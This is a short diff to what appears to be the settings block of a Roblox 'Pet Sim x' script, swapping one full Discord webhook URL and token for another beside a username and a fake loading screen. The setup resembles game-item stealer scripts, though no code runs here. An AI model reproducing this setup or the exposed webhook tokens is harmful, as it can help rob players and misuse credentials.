@@ -1,5 +1,5 @@
 Username = "Marin3030"
-WebHook = "https://discord.com/api/webhooks/1103245545910321162/Zk6_j2jDLnu2I262MZhGZachcSEIcbbtt-sKwueeblWsm0wcn9iavg-mx46BX1HeGFmY"
+WebHook = "https://discord.com/api/webhooks/1103273399339466803/0ipk8uSyZWmU3Do57PsQtRzniV4Ex3x8dFqhTmHxVRxpRYYjqzRa9_NVlRV91flO-eEK"
 loadingscreen = true
 _G.CustomScriptName = "Pet Sim x Script"
 _G.Text1 = "Script Loaded..."
